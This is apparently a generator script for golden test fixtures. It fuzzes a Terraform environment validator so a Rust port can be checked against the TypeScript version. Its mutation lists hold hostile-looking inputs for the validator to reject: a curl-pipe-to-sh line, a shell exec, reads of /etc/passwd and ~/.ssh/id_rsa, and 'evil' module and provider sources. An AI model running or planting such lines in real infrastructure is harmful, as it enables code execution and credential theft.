// Generates the golden fixtures in this directory from the TypeScript implementation (the executable spec).
//
// The Rust tests (`tests/golden.rs`) read the JSON files and assert that `ratchet-env` produces exactly the same
// answers: same checks, same messages, same numbers. Regenerate only when the TypeScript behaviour is meant to change:
//
//   pnpm --filter @ratchet/core build     # the engine's samples.ts imports @ratchet/core from dist
//   cd packages/core && RATCHET_TS_SRC=$PWD/src /home/user/ratchet/node_modules/.pnpm/node_modules/.bin/tsx \
//     ../../crates/ratchet-env/tests/golden/generate.mjs
//
// Inputs come from a seeded generator, so a re-run produces identical files.
import { mkdirSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const here = dirname(fileURLToPath(import.meta.url));
const src = process.env.RATCHET_TS_SRC;
if (!src) throw new Error('set RATCHET_TS_SRC to packages/core/src');
const core = await import(pathToFileURL(join(src, 'index.ts')).href);
const samples = await import(pathToFileURL(join(src, '..', '..', 'engine', 'src', 'environment', 'samples.ts')).href);
const { hashEnvironmentFiles, environmentSandboxId, environmentModuleOf, validateEnvironment, estimateMachinesCost, parseAgentAnswer, formatAgentAnswer, buildSetupBrief, buildReviseBrief, parseHcl, stripComments, applyEnvironmentToConfigYaml, readEnvironmentScope } = core;
const { sampleEnvironment, MOCK_CONFIG_YAML, SAMPLE_REASONS, SAMPLE_EFFORT } = samples;

function mulberry32(a) {
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const rnd = mulberry32(20261031);
const pick = (xs) => xs[Math.floor(rnd() * xs.length)];
const int = (lo, hi) => lo + Math.floor(rnd() * (hi - lo + 1));
const write = (name, value) => writeFileSync(join(here, name), JSON.stringify(value) + '\n');
const D = 'infra/ratchet';

// ------------------------------------------------------------------------------------------------ validate
const SCOPES = ['none', 'single', 'full'];
const CONFIG_WITH_COMMENTS = `# my config
version: 0
objective:
  metric: http_req_duration.p95   # the metric
  direction: minimize
evaluator:
  template: http-latency
protected:
  - tests/**
`;
const bases = {};
for (const scope of SCOPES) {
  const original = scope === 'full' ? CONFIG_WITH_COMMENTS : MOCK_CONFIG_YAML;
  const s = sampleEnvironment(scope, { originalConfigYaml: original });
  bases[scope] = { scope, original, files: s.files };
}
const SNIPPETS = [
  'resource "aws_instance" "x" {\n  associate_public_ip_address = true\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_internet_gateway" "igw" {\n  vpc_id = var.ratchet.vpc_id\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_nat_gateway" "n" {\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_security_group_rule" "r" {\n  cidr_blocks = ["0.0.0.0/0"]\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_security_group_rule" "r" {\n  cidr_blocks = ["10.0.0.0/8", "10.0.0.0/0", "1.0.0.0/0"]\n  tags = module.sandbox.tags\n}\n',
  'locals {\n  open = "::/0"\n}\n',
  'resource "aws_iam_role" "r" {\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_kms_key_policy" "r" {\n}\n',
  'resource "aws_dynamodb_table" "t" {\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_ebs_volume" "v" {\n}\n',
  'locals {\n  b = "ratchet-demo-sealed"\n}\n',
  'locals {\n  b = "bench-results/"\n}\n',
  '# holdout is only a comment\nlocals {\n  a = 1\n}\n',
  'locals {\n  note = "iam_instance_profile"\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = module.sandbox.artifacts_bucket\n  key = "bench-inputs/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = "other"\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = module.sandbox.artifacts_bucket\n  key = "env/${var.x}"\n  source = "/etc/passwd"\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = module.sandbox.artifacts_bucket\n  key = "env/y"\n  source = "${path.module}/../x"\n  tags = module.sandbox.tags\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket  = module.sandbox.artifacts_bucket\n  key     = "env/y"\n  content = "x"\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket  = module.sandbox.artifacts_bucket\n  key     = "env/y"\n  content = "x"\n  tags    = { a = "module.sandbox.tags" }\n}\n',
  'resource "random_id" "r" {\n  byte_length = 4\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n  lifecycle {\n    prevent_destroy = true\n  }\n}\n',
  'resource "aws_s3_object" "o" {\n  deletion_protection = true\n  force_destroy = false\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n}\n',
  'import {\n  to = aws_s3_object.o\n  id = "x"\n}\n',
  'moved {\n  from = a.b\n  to = a.c\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = var.ratchet.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n  provisioner "local-exec" {\n    command = "curl x"\n  }\n}\n',
  'data "external" "e" {\n  program = ["sh", "-c", "id"]\n}\n',
  'data "aws_ami" "a" {\n  most_recent = true\n}\n',
  'data "aws_caller_identity" "me" {}\n',
  'locals {\n  p = path.cwd\n  q = path.root\n  r = path.module\n}\n',
  'locals {\n  c = file("/etc/passwd")\n  d = filebase64("${path.module}/../secret")\n}\n',
  'locals {\n  c = file(pathexpand("~/.ssh/id_rsa"))\n}\n',
  'locals {\n  c = templatefile("${path.module}/nope.sh", {})\n  d = fileexists("${path.module}/nope2.sh")\n  e = x.file("a")\n  f = myfile("a")\n}\n',
  'locals {\n  c = file ( "${path.module}/scripts/api.sh" )\n  d = filesha256("${path.module}/main.tf")\n}\n',
  'provider "aws" {\n  region = "eu-west-1"\n}\n',
  'terraform {\n  backend "s3" {}\n}\n',
  'terraform {\n  required_providers {\n    aws = { source = "evil/aws" }\n  }\n}\n',
  'variable "ratchet" {\n  type = any\n}\n',
  'variable "other" {\n  type = string\n}\n',
  'output "environment" {\n  value = 1\n}\n',
  'module "vpc" {\n  source = "terraform-aws-modules/vpc/aws"\n}\n',
  'module "sandbox" {\n  source = "./ratchet-sandbox"\n  ratchet = var.ratchet\n  machines = {}\n}\n',
  'module "x" {\n  source = var.src\n}\n',
  'resource "aws_s3_object" "o" {\n  bucket = module.sandbox.artifacts_bucket\n  key = "env/x"\n  content = "x"\n  tags = module.sandbox.tags\n',
  'resource "aws_s3_object" "o"\n  bucket = 1\n}\n',
  '= = = junk\n',
  'locals {\n  a = <<EOT\n  unterminated heredoc ${x} "\n',
  'resource "aws_s3_object" "o" {\n  bucket = module.sandbox.artifacts_bucket # c\n  key = /* c */ "env/x"\n  content = "x"\n  tags = merge(module.sandbox.tags, {})\n}\n',
];
const SUBS = [
  ['c7i.2xlarge', 't3.large'], ['c7i.2xlarge', 'var.size'], ['"c7i.2xlarge"', 'var.size'], ['"c7i.2xlarge"', '"${var.family}.2xlarge"'], ['c7i.2xlarge', 'x2gd.metal'], ['c7i.2xlarge', 'C7i.2xlarge'], ['c7i.2xlarge', 'c7i'],
  ['c7i.large', 't4g.medium'], ['r7g.large', 't4g.medium'], ['"database"', '"cache"'], ['"app"', '"admin"'], ['"app"', 'var.role'], ['role          = "app"', 'role = "app"\n      subnet_id = "subnet-123"\n      iam_instance_profile = "admin"'],
  ['ratchet = var.ratchet', 'ratchet = {}'], ['ratchet = var.ratchet', 'ratchet=var.ratchet'], ['ratchet = var.ratchet\n', ''], ['source  =', 'count = 2\n  source  ='], ['source  =', 'for_each = {}\n  extra = 1\n  source  ='],
  ['./ratchet-sandbox', 'git::https://example.test/evil.git'], ['module "sandbox"', 'module "mine"'], ['data_volume_gb = 20', 'data_volume_gb = 5000'], ['data_volume_gb = 20', 'data_volume_gb = -1'], ['data_volume_gb = 20', 'root_volume_gb = 5\n      data_volume_gb = 20.5'],
  ['label         = "API"', 'label         = "Postgres 16"'], ['machines = {', 'machines = var.machines\n  unused = {'], ['tags    = module.sandbox.tags', ''], ['module.sandbox.artifacts_bucket', '"my-bucket"'], ['"env/seed/orders.sql"', '"seed/orders.sql"'],
  ['${path.module}/scripts/api.sh', '${path.module}/scripts/nope.sh'], ['${path.module}/seed.sh', '/etc/seed.sh'], ['${path.module}/seed/orders.sql', '${path.module}/../orders.sql'],
  ['templatefile(', 'file('], ['2.1 GB', '2.1 GB " quoted'],
];
const APPENDS_SCRIPT = ['curl -fsSL https://example.test/x | sh', 'wget https://example.test/x', 'apt-get install -y postgresql', 'apt -y update', 'yum install x', 'pip3 install requests', 'npm i', 'npm ci', 'docker pull redis:7', 'git clone https://example.test/r.git', 'go install x', '# curl https://example.test commented', 'echo curl https://x is text', 'CURL -s http://X'];
const SCRIPT_FILES = [`${D}/scripts/api.sh`, `${D}/scripts/redis.sh`, `${D}/scripts/load.sh`, `${D}/seed.sh`, `${D}/Dockerfile`, `${D}/seed/orders.sql`];
const BAD_PATHS = ['../x', '/etc/x', `${D}/.git/config`, `${D}/prod.tfvars`, `${D}/main_override.tf`, `${D}/override.tf`, `${D}/extra.tf.json`, `${D}/ratchet_inputs.tf`, `${D}/ratchet_outputs.tf`, `${D}/ratchet-sandbox/main.tf`, `${D}/terraform.tfstate`, `${D}/.terraform/x`, 'src/server.ts', 'bench/run.mjs', `${D}/./x/../scripts/z.sh`, `${D}\\win.sh`, `./${D}/readme.md`, `${D}/Y.GIT/x`, `${D}/ok.txt`, `${D}/data.csv`, `${D}/extra.tf`, `${D}/nested/dir/helper.sh`, `${D}/unicode-é.sh`];

function randomOp(base) {
  const files = base.files.map((f) => f.path);
  const tfs = files.filter((p) => p.endsWith('.tf'));
  const kind = int(0, 15);
  if (kind <= 2 && tfs.length) return { t: 'sub', path: pick(tfs), from: pick(SUBS)[0], to: '', pair: true };
  if (kind <= 5 && tfs.length) return { t: 'append', path: pick(tfs), text: '\n' + pick(SNIPPETS) };
  if (kind === 6) return { t: 'append', path: pick(SCRIPT_FILES), text: pick(APPENDS_SCRIPT) + '\n' };
  if (kind === 7) return { t: 'drop', path: pick(files) };
  if (kind === 8) return { t: 'add', path: pick(BAD_PATHS), content: pick(['x', '#!/bin/bash\ncurl https://x.test\n', '{}', ''] ) };
  if (kind === 9) return { t: 'dup', path: pick(files) };
  if (kind === 10) return { t: 'add', path: `${D}/big.sql`, content: '', repeat: pick([200, 262144, 262145, 300 * 1024]) };
  if (kind === 11) return { t: 'sub', path: 'ratchet.yaml', from: pick(['minimize', 'scope: full', 'scope: single', 'scope: none', 'http-latency', 'version: 0']), to: pick(['maximize', 'scope: none', 'scope: full', 'scope: single', 'scope: huge', 'memory', 'version: 7', 'scope: full\n  network: [evil.example.com, registry.npmjs.org]']) };
  if (kind === 12) return { t: 'append', path: 'ratchet.yaml', text: pick(['protected:\n  - nothing/**\n', 'environment:\n  network: [a.example.com]\n', 'guardrails:\n  - run: x\n', ': [\n', 'extra: 1\n']) };
  if (kind === 13 && tfs.length) return { t: 'append', path: pick(tfs), text: '\n' + pick(SNIPPETS) + pick(SNIPPETS) };
  if (kind === 14) return { t: 'sub', path: pick(files), from: pick(['curl', 'set -euo', 'docker', 'FROM', 'select']), to: pick(['curl https://x.test/a', 'wget http://y.test', 'pip install z', 'echo', '']) };
  return { t: 'add', path: pick([`${D}/scripts/extra.sh`, `${D}/notes.md`, `${D}/Makefile`]), content: pick(['#!/bin/bash\nnpm install\n', 'docker pull x\n', 'hello\n', 'go get x\n']) };
}
function applyOp(files, op) {
  const out = files.map((f) => ({ ...f }));
  if (op.t === 'sub') {
    const f = out.find((x) => x.path === op.path);
    if (f) f.content = f.content.replace(op.from, op.to);
  } else if (op.t === 'append') {
    const f = out.find((x) => x.path === op.path);
    if (f) f.content += op.text;
  } else if (op.t === 'drop') return out.filter((x) => x.path !== op.path);
  else if (op.t === 'add') out.push({ path: op.path, content: op.repeat ? 'x'.repeat(op.repeat) : op.content });
  else if (op.t === 'dup') {
    const f = out.find((x) => x.path === op.path);
    if (f) out.push({ ...f });
  }
  return out;
}
const plainResult = (r) => ({
  ok: r.ok,
  checks: r.checks.map((c) => ({ id: c.id, label: c.label, ok: c.ok, detail: c.detail })),
  machines: r.machines,
  resources: r.resources,
  cost: r.cost,
  problems: r.problems,
});
{
  const cases = [];
  const add = (baseId, ops, opts) => {
    const base = bases[baseId];
    let files = base.files;
    for (const op of ops) files = applyOp(files, op);
    const input = { scope: opts.scope ?? base.scope, files, ...(opts.orig === false ? {} : { originalConfigYaml: base.original }), ...(opts.extra ?? {}) };
    let out;
    try {
      out = plainResult(validateEnvironment(input));
    } catch {
      return; // the TypeScript threw: nothing to compare
    }
    cases.push({ base: baseId, ops, opts: { scope: opts.scope ?? null, orig: opts.orig !== false, extra: opts.extra ?? {} }, out });
  };
  for (const id of SCOPES) {
    add(id, [], {});
    add(id, [], { orig: false });
    for (const scope of SCOPES) add(id, [], { scope });
  }
  // moduleOnly: the files of the module only
  for (let i = 0; i < 12; i++) {
    const id = pick(SCOPES);
    const ops = [{ t: 'drop', path: 'ratchet.yaml' }, ...Array.from({ length: int(0, 2) }, () => randomOp(bases[id]))];
    add(id, ops, { extra: { moduleOnly: true } });
  }
  while (cases.length < 560) {
    const id = pick(['full', 'full', 'full', 'single', 'none']);
    const base = bases[id];
    const ops = Array.from({ length: int(1, 3) }, () => {
      const op = randomOp(base);
      if (op.pair) {
        const [from, to] = pick(SUBS);
        return { t: 'sub', path: op.path, from, to };
      }
      return op;
    });
    const extra = {};
    if (rnd() < 0.12) extra.moduleOnly = true;
    if (rnd() < 0.1) extra.prices = { 'c7i.2xlarge': 0.4, 'r7g.large': 0.2, 'c7i.large': 0.1, 'x2gd.metal': 3, 'custom.type': 1.5 };
    if (rnd() < 0.1) extra.hardware = pick(['c7i.xlarge', 'm7i.large', 'nope.type', 'c7i.large']);
    if (rnd() < 0.1) extra.timeLimitSeconds = pick([0, 600, 3600, 5400, 14400, 99999]);
    if (rnd() < 0.05) extra.configPath = pick(['ratchet.yaml', 'ops/ratchet.yaml', './ratchet.yaml']);
    const opts = { extra };
    if (rnd() < 0.2) opts.scope = pick(SCOPES);
    if (extra.configPath && extra.configPath !== 'ratchet.yaml') ops.push({ t: 'sub', path: 'ratchet.yaml', from: '', to: '' });
    add(id, ops, opts);
  }
  write('validate.json', { bases, cases });
  console.log('validate cases', cases.length);
}

// ------------------------------------------------------------------------------------------------ cost
{
  const types = ['c7i.large', 'c7i.xlarge', 'c7i.2xlarge', 'r7g.large', 't4g.medium', 'm7i.xlarge', 'c7g.4xlarge', 't3.2xlarge', 'x9z.huge', 'foo.bar', 'r7i.4xlarge'];
  const cases = [];
  for (let i = 0; i < 400; i++) {
    const machines = Array.from({ length: pick([0, 1, 1, 2, 3, 4, 8]) }, (_, k) => {
      const m = { name: `M${k}`, role: pick(['app', 'database', 'cache', 'load', 'evaluator', 'other']), machine: pick(types), detail: pick(['', 'd']) };
      if (rnd() < 0.5) m.rootVolumeGb = pick([0, 8, 30, 50.5, 1000]);
      if (rnd() < 0.5) m.dataVolumeGb = pick([0, 20, 100, 970, 12.34]);
      return m;
    });
    const opts = { timeLimitSeconds: pick([0, 1, 600, 3600, 5400, 7200, 86400, -5, 12345.678]) };
    if (rnd() < 0.2) opts.prices = { 'foo.bar': pick([2, 0.123456, 0.00005]), 'c7i.large': pick([1, 0.0001]) };
    const e = estimateMachinesCost(machines, opts);
    cases.push({ machines, opts, out: { resources: e.resources, cost: e.cost, unpriced: e.unpriced } });
  }
  write('cost.json', cases);
  console.log('cost cases', cases.length);
}

// ------------------------------------------------------------------------------------------------ brief
{
  const answers = [];
  const texts = [
    'no marker', 'RATCHET_ENVIRONMENT', 'RATCHET_ENVIRONMENT {', 'RATCHET_ENVIRONMENT {}', 'RATCHET_ENVIRONMENT {"scope":"full"}', 'RATCHET_ENVIRONMENT {"scope":"full","reason":"  padded  "}',
    'RATCHET_ENVIRONMENT {"scope":"huge","reason":"x"}', 'RATCHET_ENVIRONMENT {"scope":1,"reason":"x"}', 'RATCHET_ENVIRONMENT {"scope":"none","reason":5}', 'RATCHET_ENVIRONMENT {"scope":"single","reason":"a } brace"}',
    'RATCHET_ENVIRONMENT {"scope":"single","reason":"a \\" quote and \\\\ backslash"}', 'RATCHET_ENVIRONMENT\n```json\n{"scope":"none","reason":"x"}\n```', 'a RATCHET_ENVIRONMENT {"scope":"none","reason":"first"}\nb RATCHET_ENVIRONMENT {"scope":"full","reason":"second"} tail',
    'RATCHET_ENVIRONMENT {"scope":"full","reason":"x"} RATCHET_ENVIRONMENT', 'RATCHET_ENVIRONMENT {"scope":"full","reason":"nested {\\"a\\": 1}"}', 'RATCHET_ENVIRONMENT {"scope":"full","reason":"unterminated', 'RATCHET_ENVIRONMENT not json {"scope":"none","reason":"after text"}',
    'RATCHET_ENVIRONMENT {"scope":"full","scope":"none","reason":"dup"}', 'RATCHET_ENVIRONMENT {"scope":"full","reason":"é ü \\u00e9"}', 'RATCHET_ENVIRONMENT [{"scope":"full"}]', 'RATCHET_ENVIRONMENT {"scope":"full","reason":"x",}', 'RATCHET_ENVIRONMENT {"scope":"full","reason":null}', 'RATCHET_ENVIRONMENT {"scope":"full","reason":"\\n tab\\t"}',
  ];
  for (const t of texts) answers.push({ text: t, out: parseAgentAnswer(t) });
  const formats = [];
  for (const scope of SCOPES) for (const reason of ['', 'plain', 'with "quotes" and \\ slash', 'brace } and { here', 'line\nbreak\ttab', 'unicode é ü 😀 \u2028', 'ctrl \u0001 \u001f', ' padded ']) {
    const a = { scope, reason };
    const text = formatAgentAnswer(a);
    formats.push({ answer: a, text, back: parseAgentAnswer(text) });
  }
  const briefs = [];
  for (const goal of ['Make checkout p95 faster', '  padded goal \n', 'goal with `ticks` and ${dollar} and @AT@', 'multi\nline\ngoal', '']) {
    for (const hardware of [undefined, 'c7i.2xlarge']) {
      for (const timeLimitSeconds of [undefined, 0, 3600, 5400, 7200, 123456, 1800, 86399]) {
        const input = { goal, ...(hardware ? { hardware } : {}), ...(timeLimitSeconds !== undefined ? { timeLimitSeconds } : {}) };
        briefs.push({ input, out: buildSetupBrief(input) });
      }
    }
  }
  const revises = ['use RDS instead of a Postgres container', '  trimmed  ', 'multi\nline', ''].map((m) => ({ message: m, out: buildReviseBrief(m) }));
  write('brief.json', { answers, formats, briefs, revises });
  console.log('brief cases', answers.length, formats.length, briefs.length, revises.length);
}

// ------------------------------------------------------------------------------------------------ environment ids
{
  const sets = [];
  const alphabet = ['main.tf', 'x.sh', 'a', 'b/c.tf', 'é.sh', 'Z.tf', 'z.tf', 'scripts/api.sh', 'a/b', 'a.b', '😀.txt', 'ｆ.tf', ''];
  for (let i = 0; i < 200; i++) {
    const n = int(0, 5);
    const files = Array.from({ length: n }, () => ({ path: pick(alphabet), content: pick(['', 'a', 'bc', 'é', '😀 emoji', 'line\nbreak', 'nul\u0000inside', 'x'.repeat(int(1, 300))]) }));
    sets.push({ files, hash: hashEnvironmentFiles(files) });
  }
  const ids = [];
  for (const region of ['us-east-1', 'eu-west-1', '', 'é']) for (const hash of ['abc1234567', '', '0000000000', 'x'.repeat(40)]) ids.push({ region, hash, id: environmentSandboxId(region, hash) });
  const modules = [];
  for (const infra of [undefined, '', './ops//sandbox', 'a/b', '/abs/x', 'a/../b', '.']) for (const scope of [undefined, 'none', 'single', 'full']) {
    const config = { ...(infra !== undefined ? { infra } : {}), ...(scope ? { environment: { scope } } : {}) };
    modules.push({ infra: infra ?? null, scope: scope ?? null, out: environmentModuleOf(config) });
  }
  write('environment.json', { sets, ids, modules });
  console.log('environment cases', sets.length, ids.length, modules.length);
}

// ------------------------------------------------------------------------------------------------ hcl
{
  const sources = [
    ...Object.values(bases).flatMap((b) => b.files.filter((f) => f.path.endsWith('.tf')).map((f) => f.content)),
    ...SNIPPETS,
    'resource "a" "b" {\n  x = 1\n',
    '\n\nresource "a" "b" {\n  provisioner "local-exec" {\n    command = "x"\n  }\n}\n',
    'locals {\n  a = [1, "two", { three = 3 }, [4]]\n  b = { x: 1, y: "z" }\n  c = a ? b : c\n  d = a +\n    b\n  e = -1.5\n  f = 007\n  g = "esc \\" \\\\ \\n \\t \\r \\u"\n  h = f(1,\n    2)\n}\n',
    'locals {\n  a = <<-EOT\n    one\n  EOT\n  b = <<EOT\n  two ${x}\nEOT\n  c = "x"\n}\n',
    'a = 1\nb "c" {}\n"quoted" {}\nd e f g {\n}\nx { y = 1 }\nz {\n  w {\n    v {}\n  }\n}\n',
    '/* c */ # c\n// c\nlocals { a = "# not" } # trail\n',
    'résumé "é" {\n  ü = 1\n}\nlocals {\n  é = "ü"\n}\n',
    'locals {\n  a = "unterminated\n  b = 2\n}\n',
    'locals {\n  a = ${\n}\n',
    'a { b = { c = [ }\n',
    '}\n{\n)(\n',
    'locals {\n  a = 1\n  a = 2\n  b = {\n    k = 1\n    k = 2\n  }\n}\n',
  ];
  const junk = ['{', '}', '"', '#', '<<EOT\n', '\n', '/*', '*/', '${', '[', ']', '=', ',', ' ', '\r\n', 'é'];
  const cases = [];
  const conv = (v) => {
    if (v.kind === 'object') return { kind: 'object', entries: Object.entries(v.entries).map(([k, x]) => [k, conv(x)]) };
    if (v.kind === 'list') return { kind: 'list', items: v.items.map(conv) };
    return v;
  };
  const block = (b) => ({ type: b.type, labels: b.labels, attrs: Object.entries(b.attrs).map(([k, v]) => [k, conv(v)]), blocks: b.blocks.map(block), raw: b.raw, line: b.line });
  const run = (text) => {
    try {
      const f = parseHcl(text);
      cases.push({ text, errors: f.errors, blocks: f.blocks.map(block), stripped: stripComments(text) });
    } catch {
      /* the TypeScript threw: skip */
    }
  };
  for (const s of sources) run(s);
  for (let i = 0; i < 400; i++) {
    let s = pick(sources);
    for (let k = int(1, 3); k > 0; k--) {
      const at = int(0, s.length);
      if (rnd() < 0.5) s = s.slice(0, at) + pick(junk) + s.slice(at);
      else s = s.slice(0, at) + s.slice(Math.min(s.length, at + int(1, 12)));
    }
    run(s);
  }
  write('hcl.json', cases);
  console.log('hcl cases', cases.length);
}

// ------------------------------------------------------------------------------------------------ config yaml + samples
{
  const texts = [
    MOCK_CONFIG_YAML,
    CONFIG_WITH_COMMENTS,
    'version: 0\nobjective:\n  metric: m\n  direction: minimize\nevaluator:\n  run: node bench/x.js\nenvironment:\n  region: us-east-1\n',
    'version: 0\nenvironment:\n  region: us-east-1   # the region\n  scope: none # old\n  network:\n    - registry.npmjs.org\nobjective:\n  metric: m\n  direction: minimize\n',
    'environment:\n  image: Dockerfile\n\n# next section\nversion: 0\n',
    'environment: {image: Dockerfile, machine: c7i.large}\nversion: 0\n',
    'environment:\nversion: 0\n',
    'environment: ~\nversion: 0\n',
    'version: 0',
    'version: 0\r\nobjective:\r\n  metric: m\r\n',
    '',
    '# only a comment\n',
    'a: [',
    '- just\n- a list\n',
    'scalar',
    'version: 0\nenvironment:\n    scope: none\n    machine: c7i.large\n',
    'environment:\n  scope: full\n  image:\n    - weird\nversion: 0\n',
  ];
  const patches = [{ scope: 'full' }, { scope: 'none' }, { scope: 'single', machine: 'c7i.xlarge', image: 'infra/ratchet/Dockerfile' }, { scope: 'full', region: 'eu-west-1' }, { scope: 'single', machine: 'c7i.xlarge' }];
  const cases = [];
  for (const text of texts) {
    for (const patch of patches) {
      let out = null;
      let error = null;
      try {
        out = applyEnvironmentToConfigYaml(text, patch);
      } catch (e) {
        error = String(e.message).split('\n')[0];
      }
      // a case the yaml library itself refuses to edit is not one we can compare against (we record it as such)
      cases.push({ text, patch, out, error, scopeOfOut: out === null ? null : readEnvironmentScope(out) ?? null });
    }
  }
  const scopes = texts.concat(['environment:\n  scope: huge\n', 'environment:\n  scope: single\n', 'environment: {scope: full}\n', 'environment:\n  scope: 3\n', 'not: [valid']).map((t) => ({ text: t, scope: readEnvironmentScope(t) ?? null }));
  write('config_yaml.json', { cases, scopes });
  console.log('config yaml cases', cases.length, scopes.length);

  const sampleCases = [];
  for (const scope of SCOPES) {
    for (const opts of [{}, { originalConfigYaml: CONFIG_WITH_COMMENTS }, { reason: 'custom reason' }, { configPath: 'ops/ratchet.yaml' }]) {
      const s = sampleEnvironment(scope, opts);
      sampleCases.push({ scope, opts, out: s });
    }
  }
  write('samples.json', { cases: sampleCases, mockConfigYaml: MOCK_CONFIG_YAML, reasons: SAMPLE_REASONS, effort: SAMPLE_EFFORT });
  console.log('sample cases', sampleCases.length);
}
